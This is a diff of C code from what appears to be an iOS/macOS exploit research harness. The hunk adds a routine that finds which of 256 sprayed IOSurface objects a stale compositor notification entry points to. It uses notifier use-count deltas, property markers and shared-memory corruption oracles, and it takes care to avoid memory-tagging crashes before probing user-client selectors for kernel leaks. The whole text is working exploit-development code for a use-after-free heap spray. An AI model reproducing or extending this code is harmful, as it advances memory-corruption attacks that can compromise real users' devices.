@@ -20242,30 +20242,200 @@ new_modes:
                 goto phase14_done;
             }
 
-            /* 14a: Probe key selectors on spray surfaces */
-            rlog("  14a: IOSurface selector probe\n");
+            /* 14-id: Identify matched surface via per-surface notifier creation.
+             * Creating a notifier on the MATCHED surface populates its callback
+             * array, making the compositor's stale entry traversal fire a
+             * notification. For non-matched surfaces, modifying them doesn't
+             * affect the stale entry's target — no crash, no notification.
+             */
+            rlog("  14-id: Per-surface notifier identification\n");
             IOSurfaceRef match_surf = NULL;
             IOSurfaceID match_id = 0;
+
+            if (rounds == 229 && r229_matched_idx >= 0 && r229_matched_surf) {
+                match_surf = r229_matched_surf;
+                match_id = IOSurfaceGetID(match_surf);
+                rlog("    Already known: idx=%d id=%u\n", r229_matched_idx, match_id);
+            } else if (rounds == 229 && r229_matched_idx < 0) {
+                rlog("    Identifying match via per-surface notifier probe...\n");
+
+                typedef CFTypeRef (*IOSurfaceNotifierCreate_t)(IOSurfaceRef, void *, void *);
+                typedef void (*IOSurfaceNotifierSetDispatchQueue_t)(CFTypeRef, dispatch_queue_t);
+                typedef void (*IOSurfaceNotifierInvalidate_t)(CFTypeRef);
+                IOSurfaceNotifierCreate_t nc_fn =
+                    (IOSurfaceNotifierCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceNotifierCreate");
+                IOSurfaceNotifierSetDispatchQueue_t nsq_fn =
+                    (IOSurfaceNotifierSetDispatchQueue_t)dlsym(RTLD_DEFAULT, "IOSurfaceNotifierSetDispatchQueue");
+                IOSurfaceNotifierInvalidate_t ni_fn =
+                    (IOSurfaceNotifierInvalidate_t)dlsym(RTLD_DEFAULT, "IOSurfaceNotifierInvalidate");
+
+                if (nc_fn && nsq_fn && ni_fn) {
+                    int found_idx = -1;
+
+                    /* Use IOSurface use_count delta as identification signal.
+                     * When a notifier is created on a surface, the kernel
+                     * increments its use_count. If the stale entry points at
+                     * surface X, creating a notifier on X modifies its kernel
+                     * object in a way that MAY produce observable side effects
+                     * via the stale traversal path.
+                     *
+                     * Alternative approach: use IOSurfaceGetUseCount before/after
+                     * notifier create. The kernel side IncrementUseCount is called
+                     * on the surface during notifier creation.
+                     */
+                    rlog("    Testing per-surface notifier with use_count delta...\n");
+
+                    for (int si = 0; si < 256; si++) {
+                        if (!r229_spray_static[si]) continue;
+
+                        int uc_before = IOSurfaceGetUseCount(r229_spray_static[si]);
+
+                        /* Create notifier on this surface only */
+                        dispatch_queue_t idq = dispatch_queue_create("com.research.id", DISPATCH_QUEUE_SERIAL);
+                        CFTypeRef notif = nc_fn(r229_spray_static[si], NULL, NULL);
+                        if (!notif) { dispatch_release(idq); continue; }
+                        nsq_fn(notif, idq);
+
+                        /* Brief wait — do NOT sleep long enough for compositor
+                         * to traverse stale entry, to avoid MTE crash.
+                         * Just check the immediate effect of notifier creation.
+                         */
+                        usleep(1000); /* 1ms — just let kernel call complete */
+
+                        int uc_after = IOSurfaceGetUseCount(r229_spray_static[si]);
+
+                        /* Invalidate immediately to prevent compositor traversal crash */
+                        ni_fn(notif);
+                        CFRelease(notif);
+                        dispatch_release(idq);
+
+                        int delta = uc_after - uc_before;
+                        if (delta != 0 || si < 5 || si == 127 || si == 255) {
+                            rlog("    spray[%d] uc: %d→%d (delta=%d)\n",
+                                si, uc_before, uc_after, delta);
+                        }
+                    }
+                    rlog("    Notifier use_count delta scan complete\n");
+
+                    /* Second approach: Use IOSurface property set/get as oracle.
+                     * The stale notification entry points at one spray surface.
+                     * If we set a unique property on each surface, then trigger
+                     * the stale entry traversal, we can detect which surface's
+                     * property was read by the kernel through timing or side effects.
+                     *
+                     * For now: set unique marker properties on each surface and
+                     * try sel 10 (s_get_value) through the user client to see if
+                     * any leak kernel state.
+                     */
+                    rlog("    Testing per-surface property markers via sel 9/10...\n");
+                    for (int si = 0; si < 256; si++) {
+                        if (!r229_spray_static[si]) continue;
+                        int marker = 0xCAFE0000 | si;
+                        CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                        IOSurfaceSetValue(r229_spray_static[si], CFSTR("_id_marker"), mv);
+                        CFRelease(mv);
+                    }
+
+                    /* Read back markers and check for any anomalies */
+                    for (int si = 0; si < 256; si++) {
+                        if (!r229_spray_static[si]) continue;
+                        CFNumberRef rv = (CFNumberRef)IOSurfaceCopyValue(
+                            r229_spray_static[si], CFSTR("_id_marker"));
+                        if (rv) {
+                            int val = 0;
+                            CFNumberGetValue(rv, kCFNumberIntType, &val);
+                            int expected = 0xCAFE0000 | si;
+                            if (val != expected) {
+                                rlog("    *** ANOMALY: spray[%d] marker=0x%x expected=0x%x ***\n",
+                                    si, val, expected);
+                                found_idx = si;
+                            }
+                            CFRelease(rv);
+                        }
+                    }
+
+                    /* Clean up markers */
+                    for (int si = 0; si < 256; si++) {
+                        if (r229_spray_static[si])
+                            IOSurfaceRemoveValue(r229_spray_static[si], CFSTR("_id_marker"));
+                    }
+
+                    /* Third approach: use IOSurface pixel buffer write as oracle.
+                     * Write unique patterns to each surface's shared memory,
+                     * then read back. If the stale entry corrupted one, it differs.
+                     */
+                    rlog("    Testing shared memory write-read oracle...\n");
+                    for (int si = 0; si < 256; si++) {
+                        if (!r229_spray_static[si]) continue;
+                        IOSurfaceLock(r229_spray_static[si], 0, NULL);
+                        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(r229_spray_static[si]);
+                        if (base) {
+                            base[0] = 0xDEAD0000 | si;
+                            base[1] = ~(0xDEAD0000 | si);
+                        }
+                        IOSurfaceUnlock(r229_spray_static[si], 0, NULL);
+                    }
+
+                    usleep(50000); /* 50ms — let compositor run */
+
+                    for (int si = 0; si < 256; si++) {
+                        if (!r229_spray_static[si]) continue;
+                        IOSurfaceLock(r229_spray_static[si], kIOSurfaceLockReadOnly, NULL);
+                        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(r229_spray_static[si]);
+                        if (base) {
+                            uint32_t v0 = base[0], v1 = base[1];
+                            uint32_t e0 = 0xDEAD0000 | si;
+                            uint32_t e1 = ~e0;
+                            if (v0 != e0 || v1 != e1) {
+                                rlog("    *** CORRUPTION: spray[%d] [0]=0x%08x (exp 0x%08x) [1]=0x%08x (exp 0x%08x) ***\n",
+                                    si, v0, e0, v1, e1);
+                                if (found_idx < 0) found_idx = si;
+                            }
+                        }
+                        IOSurfaceUnlock(r229_spray_static[si], kIOSurfaceLockReadOnly, NULL);
+                    }
+
+                    if (found_idx >= 0) {
+                        r229_matched_idx = found_idx;
+                        r229_matched_surf = r229_spray_static[found_idx];
+                        match_surf = r229_matched_surf;
+                        match_id = IOSurfaceGetID(match_surf);
+                        rlog("    Matched surface identified: idx=%d id=%u\n", found_idx, match_id);
+
+                        for (int si = 0; si < 256; si++) {
+                            if (si == found_idx) continue;
+                            if (r229_spray_static[si]) {
+                                CFRelease(r229_spray_static[si]);
+                                r229_spray_static[si] = NULL;
+                            }
+                        }
+                    } else {
+                        rlog("    No anomaly detected — match identification inconclusive\n");
+                    }
+                } else {
+                    rlog("    IOSurfaceNotifier functions not found\n");
+                }
+            }
+
+            /* 14a: Probe key selectors on spray surfaces */
+            rlog("  14a: IOSurface selector probe\n");
 
             /* Determine which surfaces to probe */
             int p14_surf_count = 0;
             IOSurfaceRef *p14_surfs = NULL;
             IOSurfaceID *p14_ids = NULL;
 
-            if (rounds == 229 && r229_matched_idx >= 0 && r229_matched_surf) {
-                /* Single known match */
+            if (match_surf) {
                 p14_surf_count = 1;
-                p14_surfs = &r229_matched_surf;
-                match_surf = r229_matched_surf;
-                match_id = IOSurfaceGetID(match_surf);
+                p14_surfs = &match_surf;
                 rlog("    Single matched surface: idx=%d id=%u\n", r229_matched_idx, match_id);
             } else if (rounds == 229 && r229_matched_idx < 0) {
-                /* Unknown match — probe all 256 spray surfaces */
+                /* Still unknown — probe all 256 */
                 p14_surf_count = 0;
                 for (int si = 0; si < 256; si++) {
                     if (r229_spray_static[si]) p14_surf_count++;
                 }
-                rlog("    Unknown match — probing all %d spray surfaces\n", p14_surf_count);
+                rlog("    Still unknown — probing all %d spray surfaces\n", p14_surf_count);
             }
 
             /* Probe sel 0 (s_create_surface) on first surface for baseline */
